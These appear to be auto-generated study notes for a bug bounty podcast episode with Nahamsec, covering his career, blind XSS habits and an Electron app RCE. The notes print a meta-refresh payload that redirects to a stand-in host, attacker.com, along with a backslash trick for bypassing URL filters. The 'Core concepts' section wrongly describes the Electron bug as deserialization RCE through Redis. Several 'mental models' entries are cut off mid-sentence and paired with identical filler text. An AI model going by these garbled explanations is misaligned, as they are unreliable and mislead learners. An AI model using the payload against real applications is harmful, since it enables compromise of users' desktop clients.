---
title: "500k/yr as Full-Time Bug Hunter & Content Creator — Nahamsec"
episode: 53
---


# Episode 53 500k/yr as Full-Time Bug Hunter & Content Creator — Nahamsec

### TL;DR
- Ben (Nahamsec) shares journey from Twitch streaming burnout to 500K bug bounty year
- Pivoted from recon-focused content to manual deep-dive hacking
- Blind XSS methodology: assume every field ends up in an admin panel; use your own Blind XSS payload everywhere
- Going the extra mile: open credit cards, verify ID, take onboarding calls, submit tax docs as payloads

### Key takeaways
- Streaming recon 4-5 days/week made him great at recon but bad at finding bugs (practice = reality)
- Switching from recon to manual: analyzed past reports to find strengths; realized old success came from deep-dive on one program (Airbnb)
- Don't associate your identity with a niche; pivot when growth plateaus
- Desktop app hacking (Electron): CSP limitations don't apply the same way — a simple HTML injection (meta refresh with backslash) can lead to RCE
- Use your own Blind XSS payload everywhere — tracks where your data appears, finds hidden functionality
- Pay for premium tiers, verify ID, open accounts — the ROI on access is massive

### Bugs and Findings
#### Electron Desktop App RCE via Meta Refresh HTML Injection
- **Target/context:** Desktop app with CSP limitations on web version
- **Root cause:** HTML injection in a user profile field rendered in the desktop app
- **Technique:**
  1. Found HTML injection — inserted `<meta http-equiv="refresh" content="0;url=http://attacker.com">`
  2. App blocked double-slash URLs (`//`), but backslash-backslash (`\\`) also works: browser translates `\\` to `//`
  3. Meta refresh redirected the Electron app to attacker-controlled page
  4. Attacker page executed arbitrary JavaScript in the Electron context (no CSP)
- **Key technical details:** `\\attacker.com` is treated as `//attacker.com` by the browser; bypasses double-slash filter
- **Impact / severity / bounty:** RCE via desktop app -> $40k (rated High because full RCE couldn't be proven)

### Techniques and Primitives
- **Blind XSS with custom payload** — always use your own Blind XSS payload (JS file exfiltrating data + PHP catcher) instead of a standard `alert()`
- **Credit card/Banking accounts as attack surface** — if a company has a bug bounty program, open their credit card, retirement account, etc. — more configured state = more attack surface
- **Fraud detection as trigger** — trigger a ban (report fraud on your own account) to force a human to review your data -> Blind XSS fires in the admin panel

### Tooling and Resources
- **XSSHunter** (modified) — custom JS payload + PHP callback
- **Best Self Journal** — goal-setting framework
- **Bug Bounty Stats** — performance tracking

### Suggestions and Advices from Hunter
- "I realized if I only practice recon, I only become good at recon, not at finding bugs"
- "For every hour of content you make, you put in about five hours of work"
- "The more you f*** around, the more you find out"
- On streaming: "You show the authentic version of yourself — even mistakes. People will judge, but that's okay."
- "You have to be okay with having days where you don't hack. That's how you prevent burnout."
- "Use your Blind XSS payload everywhere. It helps you track where your data goes. When a bug fires on a device you can't inspect, you can't modify the payload — so having a good default payload matters."

### AI Takeaway
The backslash -> double-slash browser conversion is a critical detail for bypassing URL filters. The broader lesson is that desktop/Electron apps are often just web apps without CSP — any HTML injection is effectively an XSS with full impact. Ben's 500K year shows that deep-dive on one high-paying program outperforms wide recon.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Ben (Nahamsec) shares journey from Twitch streaming burnout to 500K bug bounty year

#### 2. What you should learn
- Understand **streaming recon 4-5 days/week made him great at recon but bad at finding bugs (practice = reality)**
- Understand **switching from recon to manual: analyzed past reports to find strengths; realized old success came from deep-dive on one program (airbnb)**
- Understand **don't associate your identity with a niche; pivot when growth plateaus**
- Understand **desktop app hacking (electron): csp limitations don't apply the same way — a simple html injection (meta refresh with backslash) can lead to rce**
- Understand **use your own blind xss payload everywhere — tracks where your data appears, finds hidden functionality**

#### 3. Core concepts explained
**Electron Desktop App RCE via Meta Refresh HTML Injection**
- **What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains.
- **Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE).
- **Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication.

**Blind XSS with custom payload**
- always use your own Blind XSS payload (JS file exfiltrating data + PHP catcher) instead of a standard `alert()`

**Credit card/Banking accounts as attack surface**
- if a company has a bug bounty program, open their credit card, retirement account, etc. — more configured state = more attack surface

**Fraud detection as trigger**
- trigger a ban (report fraud on your own account) to force a human to review your data -> Blind XSS fires in the admin panel


#### 4. Techniques and tactics
**Blind XSS with custom payload**
- **What it is:** always use your own Blind XSS payload (JS file exfiltrating data + PHP catcher) instead of a standard `alert()`
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Credit card/Banking accounts as attack surface**
- **What it is:** if a company has a bug bounty program, open their credit card, retirement account, etc. — more configured state = more attack surface
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Fraud detection as trigger**
- **What it is:** trigger a ban (report fraud on your own account) to force a human to review your data -> Blind XSS fires in the admin panel
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"I realized if I only practice recon, I only become good at recon, not at finding bugs"*
- *"For every hour of content you make, you put in about five hours of work"*
- *"The more you f*** around, the more you find out"*
- *"On streaming: "You show the authentic version of yourself"* — **even mistakes. People will judge, but that's okay.**
- *"You have to be okay with having days where you don't hack. That's how you prevent burnout."*
- *"Use your Blind XSS payload everywhere. It helps you track where your data goes. When a bug fires on a device you can't inspect, you can't modify the payload"* — **so having a good default payload matters.**

#### 6. Mental models
- **I realized if I only practice recon, I only become good at r** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **For every hour of content you make, you put in about five ho** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **The more you f*** around, the more you find out** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Streaming recon 4-5 days/week made him great at recon but bad at finding bugs (practice = reality)
- **Try this:** Switching from recon to manual: analyzed past reports to find strengths; realized old success came from deep-dive on one program (Airbnb)
- **Try this:** Don't associate your identity with a niche; pivot when growth plateaus
- **Try this:** Desktop app hacking (Electron): CSP limitations don't apply the same way — a simple HTML injection (meta refresh with backslash) can lead to RCE

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **recon** — Reconnaissance — systematic discovery of target attack surface

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Electron Desktop App RCE via Meta Refresh HTML Injection?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Ben (Nahamsec) shares journey from Twitch streaming burnout to 500K bug bounty y**
2. **Streaming recon 4-5 days/week made him great at recon but bad at finding bugs (p**
3. **Switching from recon to manual: analyzed past reports to find strengths; realize**
